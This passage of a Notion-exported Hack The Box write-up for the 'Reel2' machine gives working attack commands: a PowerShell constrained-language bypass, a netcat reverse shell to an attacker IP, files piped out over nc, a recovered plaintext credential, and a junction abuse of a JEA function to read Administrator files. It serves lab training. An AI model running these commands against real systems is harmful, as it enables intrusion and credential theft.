&{pwd}",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/8057d70f2c484e36bea9954fae572eae","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["C:\\Users\\k.svensson\\Documents"]],"language":"PowerShell","wrap":false},{"children":[],"uri":"https://www.notion.so/7e21ac00c8434a44846228aaa0c98c23","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> &{type ..\\Desktop\\user.txt}",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/c308174f10074ea389d635b284322738","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["a159------------------------1519"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/d03fce9b54b1412daa3acf7af379cb97","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Though, we can use the script block expression "],["&{command}",[["c",null]]],[" to bypass this restriction:"]]},{"children":[],"uri":"https://www.notion.so/6d8203b7390141899c0ea8b1e9b340f9","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Get user flag!"]]},{"children":[],"uri":"https://www.notion.so/15dcc992e2ab41118ee4b8d523b8c864","type":"heading","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Privilege Escalation"]],"depth":2},{"children":[],"uri":"https://www.notion.so/d6fa5ebc04a244fa88b7a061e3710f13","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["To make things easier to navigate, let's upgrade to an unrestricted shell using "],["nc",[["c",null]]],["."]]},{"children":[{"children":[],"uri":"https://www.notion.so/776d4cbac78d45be9eade68ede7c11ab","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["$ cp ../Common/nc64.exe ./ && updog",[["c",null]]]]}],"uri":"https://www.notion.so/b79434474c6a4bb6bd2aee34e4d80140","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Host "],["nc64",[["c",null]]],[" binary on HTTP:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/ee821ff7580b43418644e50d53aee5ed","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> &{iwr -uri http://10.10.14.103:9090/nc64.exe -o 'C:\\Users\\k.svensson\\Videos\\nc64.exe'}",[["c",null]]]]}],"uri":"https://www.notion.so/3ba6393fadfd4db68cf260ef7d269ea2","type":"bulleted_list","createdTime":1616222333132,"lastEditedTime":1616222280000,"title":[["Get "],["nc64",[["c",null]]],[" binary from target host with "],["Invoke-WebRequest",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/dd9ebe6ff19b425b8b1d12ffc8db48b3","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["$ nc -lvnp 6969",[["c",null]]]]}],"uri":"https://www.notion.so/9cd93bcab3954f6a9de1eb9218ab9e6d","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["On our local machine, listen for a reverse connection:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/7969ca7aebf0418cb3a983514c476481","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> &{./nc64.exe 10.10.14.103 6969 -e powershell.exe}",[["c",null]]]]}],"uri":"https://www.notion.so/47f8667d0d1646ebb859e13dc7f72085","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Establish a PowerShell session with "],["nc",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/71f89b71460e4c74a6afdc51e7a9c7b0","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> $ExecutionContext.SessionState.LanguageMode",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/ee5c186c2902467a892e4697f0e8abf9","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["FullLanguage"]],"language":"PowerShell","wrap":false}],"uri":"https://www.notion.so/537df601a03346b3af462059a6c88df7","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["We should now get an unrestricted reverse shell as k.svensson, with full language capabilities:"]]},{"children":[],"uri":"https://www.notion.so/518dcf9149814eb386760d16be0a331c","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Now that we don't need to use the "],["&{}",[["c",null]]],[" script block to send commands, we can start enumerating further."]]},{"children":[{"children":[],"uri":"https://www.notion.so/06a4c7176ad44ab7b7e0b8d667c89bef","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> ls 'C:\\Users\\k.svensson\\Documents\\'",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/5c987751bef54f52acbacb338d2a83ae","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["Directory: C:\\Users\\k.svensson\\Documents\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----        7/30/2020   5:14 PM                WindowsPowerShell\n-a----        7/31/2020  11:58 AM           5600 jea_test_account.psrc\n-a----        7/31/2020  11:58 AM           2564 jea_test_account.pssc"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/b26ca75a2d6e400390f299e9483bfc86","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["We find "],[".psrc",[["c",null]]],[" (role capabilities) and "],[".pssc",[["c",null]]],[" (session configuration) files for the jea_test_account in "],["~\\Documents",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/0b9f19c84cae40f9abe1dfed3a002c7c","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> type ./jea_test_account.psrc | ../Videos/nc64.exe 10.10.14.103 1337",[["c",null]]]]}],"uri":"https://www.notion.so/ccc2759128ef48cf96eacc44e9c060cc","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Since the "],["WindowsPowerShell",[["c",null]]],[" folder is empty, let's transfer only the other PowerShell files back to our local machine:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/c35b3059d4764f97b77e52a49b96755d","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["FunctionDefinitions = @{\n  'Name' = 'Check-File'\n  'ScriptBlock' = {param($Path,$ComputerName=$env:COMPUTERNAME) [bool]$Check=$Path -like \"D:\\*\" -or $Path -like \"C:\\ProgramData\\*\" ; if($check) {get-content $Path}} }"]],"language":"PowerShell","wrap":false}],"uri":"https://www.notion.so/31011c8f3f3c42efa6e9d8b18db6d9ff","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Looking at the "],[".psrc",[["c",null]]],[" file, we find a "],["Check-File",[["c",null]]],[" function defined under jea_test_account:"]]},{"children":[],"uri":"https://www.notion.so/31f7eebd8f3c41f982e20277a82f28fe","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["The function appears to first run a check on whether if a file is in "],["C:\\ProgramData\\",[["c",null]]],[", and then runs "],["Get-Content",[["c",null]]],[" on the file. We might be able to leverage this function to read privileged files."]]},{"children":[{"children":[],"uri":"https://www.notion.so/5c8dac0e616b48558677ebcb1f9be043","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> Get-ChildItem -Path C:\\ -Filter *.log -Recurse -File -Name -Force",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/dd4879e5a4c84c378ce5c29bc7018c4a","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["...\nUsers\\k.svensson\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V010000F.log\nUsers\\k.svensson\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V0100010.log\nUsers\\k.svensson\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01tmp.log\nUsers\\k.svensson\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\5hx9aux9.default-release\\cache2\\index.log\nUsers\\k.svensson\\AppData\\Local\\Temp\\wmsetup.log\nUsers\\k.svensson\\AppData\\Roaming\\stickynotes\\Local Storage\\leveldb\\000003.log"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/426a2726084a4a8fa0ff73b9124e6460","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Finding "],[".log",[["c",null]]],[" files:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/f3e7d295e0514fd49c148ba9b24fc977","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> ls 'C:\\Users\\k.svensson\\AppData\\Roaming\\stickynotes'",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/b1f5d6b4fb394a8c84baa8ef062b30ff","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["Directory: C:\\Users\\k.svensson\\AppData\\Roaming\\stickynotes\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----        2/14/2021   7:36 AM                blob_storage\nd-----        7/30/2020   1:19 PM                Cache\nd-----        7/30/2020   1:19 PM                GPUCache\nd-----        7/30/2020   1:19 PM                Local Storage\nd-----        7/30/2020   1:19 PM                logs\n-a----        7/30/2020   1:19 PM             36 .updaterId\n-a----        7/30/2020   1:19 PM          20480 Cookies\n-a----        7/30/2020   1:19 PM              0 Cookies-journal\n-a----        7/30/2020   1:23 PM            159 Network Persistent State"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/272c6551e2c14ae4a16fe0326ffbb4be","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["We see a directory in "],["%appdata%\\Roaming",[["c",null]]],[" called "],["stickynotes",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/816b45bd7061424ab5fc4630d05255ac","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> Compress-Archive -Path 'C:\\Users\\k.svensson\\AppData\\Roaming\\stickynotes\\Local Storage\\*' -DestinationPath 'C:\\Users\\k.svensson\\Videos\\stickynotes.zip'",[["c",null]]]]}],"uri":"https://www.notion.so/9b06a7add862457292c352d9b83397e2","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Zip up the directory:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/c4f5c40616d14095b533a202db349b1f","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["ZipArchiveHelper : The process cannot access the file 'C:\\Users\\k.svensson\\AppData\\Roaming\\stickynotes\\Cache\\index' because it is being used by another process."]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/7e4b90d048524ef998bd434e7fe77f2f","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Getting error messages, we see that some cache files could not be accessed because the "],["stickynotes",[["c",null]]],[" application is currently running:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/8846aaf8a90c49e7b9c2b57b64910071","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> ps",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/2bd1748fb73a4b10bbfb641b146eb398","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n468      36        24872      50680      66.80   6284   1 stickynotes\n340      29        21120      34200      77.36   6612   1 stickynotes\n251      30        46512      67312     139.00   6708   1 stickynotes"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/85e0bca509aa4e0ca2c506907193e948","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Checking currently running processes:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/761b23a9bf2d40fc8c5aed2aef03b1e3","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> Copy-Item -Path \"C:\\Users\\k.svensson\\AppData\\Roaming\\stickynotes\\*\" -Force",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/48f8ba044e6c44f4a90cef6a9de72ea5","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> Compress-Archive -Path 'C:\\Users\\k.svensson\\Videos\\stickynotes\\*' -DestinationPath 'C:\\Users\\k.svensson\\Videos\\stickynotes.zip'",[["c",null]]]]}],"uri":"https://www.notion.so/6acdcd321b2b4fa4942a7ecbd43c43d7","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Retry by first copying the files to a separate directory and then zipping:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/e3591195d638472fb948fd12b8e354f0","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> type 'C:\\Users\\k.svensson\\Videos\\stickynotes.zip' | ./nc64.exe 10.10.14.103 1337",[["c",null]]]]}],"uri":"https://www.notion.so/fa1f9a131d9b48f99637c4d6d537cfd6","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Send back the contents of this directory to investigate locally:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/5465b71310184989b14e84b78d9324f7","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["> type 'C:\\Users\\k.svensson\\AppData\\Roaming\\stickynotes\\Local Storage\\leveldb\\000003.log' | ./nc64.exe 10.10.14.103 1337",[["c",null]]]]}],"uri":"https://www.notion.so/4bbc16490d494c32804ae56ee4a88f6b","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Turns out the zip file was corrupted in the transfer. Can't be bothered to make this work now, so let's just copy the logfile individually:"]]},{"children":[],"uri":"https://www.notion.so/bfcfe91574e3402f92f9f3b8a741474e","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Looking at the "],["000003.log",[["c",null]]],[" file, we see that there are non-ASCII characters that can't be displayed in our editor."]]},{"children":[{"children":[],"uri":"https://www.notion.so/757be989c7af44f18d82862f0af9aa0f","type":"text","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["$ strings 000003.log",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/afd16aefd86841c8acdebc3332be5e6d","type":"code","createdTime":1616222333137,"lastEditedTime":1616222280000,"title":[["...\n{\"first\":\"<p>Credentials for JEA</p><p>jea_test_account:Ab!Q@vcg^%@#1</p>\",\"back\":\"rgb(255, 242, 171)\",\"title\":\"rgb(255, 235, 129)\",\"wid\":\"350\",\"hei\":\"375\",\"deleted\":\"no\",\"closed\":\"yes\",\"locked\":\"no\"}"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/23ba7da6a83740cc80a93a1ca68a0c3f","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Running "],["strings",[["c",null]]],[" against the log file:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/fca7dd45302a489aa367816703c8f7b4","type":"text","createdTime":1616222333137,"lastEditedTime":1616230560000,"title":[["jea_test_account:Ab!Q@vcg^%@#1",[["c",null]]]]}],"uri":"https://www.notion.so/65d2f363cc33458dabb9b2dcdce6dc84","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Found credentials for JEA test account:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/f8ea3722d73f4901b6ea4e4d6dbaafe1","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["$ pwsh",[["c",null]]]]}],"uri":"https://www.notion.so/081e1cf563334420894800af6834900e","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Creating a new PowerShell session and remoting in as jea_test_account:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/f6e82d5174f0400ea59cc86919f5b3e0","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["> $username = \"jea_test_account\"",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/94a52c5968d04e5ebb474a987cc073ae","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["> $password = ConvertTo-SecureString \"Ab!Q@vcg^%@#1\" -AsPlainText -Force",[["c",null]]]]}],"uri":"https://www.notion.so/647e07a6e3514b23b8729c3410fb73cf","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Since the password contain special characters, let's define some credential variables:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/1037a4d1e03b40569104729c642690c0","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["> $cred = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)",[["c",null]]]]}],"uri":"https://www.notion.so/9cd2017ac55840148c98b8e2cda14be8","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Define a credential object:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/29361bf033d04a9596ef7effeeba46a9","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["> $session = New-PSSession -Computer 10.10.10.210 -credential $cred -Authentication Negotiate -ConfigurationName jea_test_account",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/bfdcb85bb71e497ea72b116f7fa29234","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["> Enter-PSSession $session",[["c",null]]]]}],"uri":"https://www.notion.so/26c67f2de68b459fb576678c127c870d","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Initiate the session and enter it:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/f5123555a1114a1a8264413089a4c6cb","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["> Get-Command",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/e2b31f8c1c074d26868e19a22393a1da","type":"code","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["CommandType     Name                                               Version    Source\n-----------     ----                                               -------    ------\nFunction        Check-File\nFunction        Clear-Host\nFunction        Exit-PSSession\nFunction        Get-Command\nFunction        Get-FormatData\nFunction        Get-Help\nFunction        Measure-Object\nFunction        Out-Default\nFunction        Select-Object"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/ce221140a43c49df9827d03c397872c4","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["Checking available commands on jea_test_account:"]]},{"children":[],"uri":"https://www.notion.so/f029605e695540e7b32471f3037c0e04","type":"bulleted_list","createdTime":1616222333133,"lastEditedTime":1616222280000,"title":[["We can see the custom defined "],["Check-File",[["c",null]]],[" function we found earlier in the "],[".psrc",[["c",null]]],[" file."]]},{"children":[{"children":[],"uri":"https://www.notion.so/705fa4fae551421db8fd5a790ef097cb","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["> New-Item -ItemType Junction -Path 'C:\\ProgramData\\pwn' -Target 'C:\\Users\\Administrator'",[["c",null]]]]}],"uri":"https://www.notion.so/56aed35ed7834428b0ad36fbb13585be","type":"bulleted_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["On k.svensson's session, let's now create a symbolic link between an arbitrary folder in "],["C:\\ProgramData",[["c",null]]],[" and "],["C:\\Users\\Administrator",[["c",null]]],[" to abuse the privileged file read in "],["Check-File",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/828337ba63f04cee99da63cf7e2827b2","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["> Check-File C:\\ProgramData\\pwn\\Desktop\\root.txt",[["c",null]]]]}],"uri":"https://www.notion.so/8414a51a58154a1e8f7a3d8b86513a87","type":"bulleted_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["Execute the read payload on jea_test_account:"]]},{"children":[],"uri":"https://www.notion.so/61d1d25813534810b6b4cefb40f76bfb","type":"bulleted_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["Get root flag!"]]},{"children":[],"uri":"https://www.notion.so/36062e009fa04e23b2f76f7b4a450b99","type":"heading","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["Persistence"]],"depth":2},{"children":[],"uri":"https://www.notion.so/50db8be7c4504c799f1baee6eeb65d7f","type":"bulleted_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["It wasn't possible to get an administrator shell on this machine (as far as I was aware)."]]},{"children":[],"uri":"https://www.notion.so/65d78a2a576a402f9cbed32b8a273b2d","type":"bulleted_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["There is an easier and quieter way to get a "],["nc",[["c",null]]],[" reverse shell from k.svensson, without needing to download the "],["nc64.exe",[["c",null]]],[" binary onto the victim's computer manually."]]},{"children":[{"children":[],"uri":"https://www.notion.so/2619fc87f8c54868973ccb5a35f54419","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["$ sudo smbserver.py samiko ./ -smb2support",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/325716debe494cb4a85f3d2de619799e","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["$ nc -lvnp 1337",[["c",null]]]]}],"uri":"https://www.notion.so/73450056bbbb4abea5c2719d9405246e","type":"bulleted_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["Host an SMB share containing the "],["nc64.exe",[["c",null]]],[" binary and listen for a reverse connection:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/1cbd30a912014b9abef5b54d73dd43b7","type":"text","createdTime":1616222333138,"lastEditedTime":1616222280000,"title":[["> &{\\\\10.10.14.103\\\\samiko\\\\nc64.exe 10.10.14.103 1337 -e powershell.exe}",[["c",null]]]]}],"uri":"https://www.notion.so/01ed25fdb474435a9b7ebcc8e536ea5d","type":"bulleted_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["On the restricted PowerShell session, simply execute:"]]},{"children":[],"uri":"https://www.notion.so/7726482458164c379009b159bbc9e2d9","type":"heading","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["Resources"]],"depth":2},{"children":[],"uri":"https://www.notion.so/22d1e1b5b5374ca3b5a62849525ed855","type":"numbered_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["https://github.com/munafio/wallstant",[["a","https://github.com/munafio/wallstant"]]]]},{"children":[],"uri":"https://www.notion.so/eb12e321ee8d4de5b1cec6287405625a","type":"numbered_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["https://book.hacktricks.xyz/windows/active-directory-methodology/password-spraying#outlook-web-access",[["a","https://book.hacktricks.xyz/windows/active-directory-methodology/password-spraying#outlook-web-access"]]]]},{"children":[],"uri":"https://www.notion.so/0b5c9a7efc28488f9e0fd10e5732418b","type":"numbered_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook",[["a","https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook"]]]]},{"children":[],"uri":"https://www.notion.so/43d9b745fb0745a8abb7aa0ba6f08eff","type":"numbered_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["https://blog.rapid7.com/2020/04/06/phishing-for-system-on-microsoft-exchange-cve-2020-0688/",[["a","https://blog.rapid7.com/2020/04/06/phishing-for-system-on-microsoft-exchange-cve-2020-0688/"]]]]},{"children":[],"uri":"https://www.notion.so/a7679c9308514c06a6a0dfaeaca8b4d8","type":"numbered_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1",[["a","https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1"]]]]},{"children":[],"uri":"https://www.notion.so/c101bb3fdba44d1394647e5a4aedb9cd","type":"numbered_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/",[["a","https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/"]]]]},{"children":[],"uri":"https://www.notion.so/8c388c030fcc4184b020424a1ad59700","type":"numbered_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass",[["a","https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass"]]]]},{"children":[],"uri":"https://www.notion.so/5a9371420b974ec7ba9c8b46282c7ba8","type":"numbered_list","createdTime":1616222333134,"lastEditedTime":1616222280000,"title":[["https://winaero.com/create-symbolic-link-windows-10-powershell/",[["a","https://winaero.com/create-symbolic-link-windows-10-powershell/"]]]]}],"uri":"https://www.notion.so/2854819efc834aa0a7731f32b1146d65","type":"page","createdTime":1616222333130,"lastEditedTime":1616230740000,"title":[["Reel2 - 10.10.10.210"]],"icon":"https://www.hackthebox.eu/storage/avatars/a0c58eb31c178eee9c88bda6fe3b114c.png","fullWidth":true,"coverPosition":1,"properties":{"!`\"w":[["Yes"]],"'2]%":[["reel2"]],"98uZ":[["Hard-difficulty Windows box with a focus on password spraying attacks and NetNTLMv2 hash phishing on Outlook. Privilege escalation by abusing an insecure Powershell JEA cmdlet with symbolic links, while bypassing PS constrained language mode."]],":H`m":[["Yes"]],"xY$N":[["‣",[["d",{"type":"datetime","time_zone":"Australia/Adelaide","start_date":"2021-03-20","start_time":"17:09"}]]]],"{iD?":[["Hard,Windows,Password Spraying,Outlook Web App,Powershell JEA"]],"|Ay0":[["post"]],"title":[["Reel2 - 10.10.10.210"]],"34dcb6ea-0b54-4d5c-97f2-1b547c003948":[["Yes"]],"3fe3e3bf-9500-4abb-8acd-67aba88e6f47":[["https://www.hackthebox.eu/home/machines/profile/281",[["a","https://www.hackthebox.eu/home/machines/profile/281"]]]],"7df966e1-a25b-4512-8e5c-761390b4c971":[["‣",[["d",{"type":"datetimerange","end_date":"2021-02-15","end_time":"04:13","time_zone":"Australia/Adelaide","start_date":"2021-02-05","start_time":"22:57"}]]]],"91d2ba37-40ae-4835-a8e9-f8710a2ecaf6":[["Yes"]],"c8554f2b-cb52-4987-be70-6d00db874c2b":[["Yes"]]}}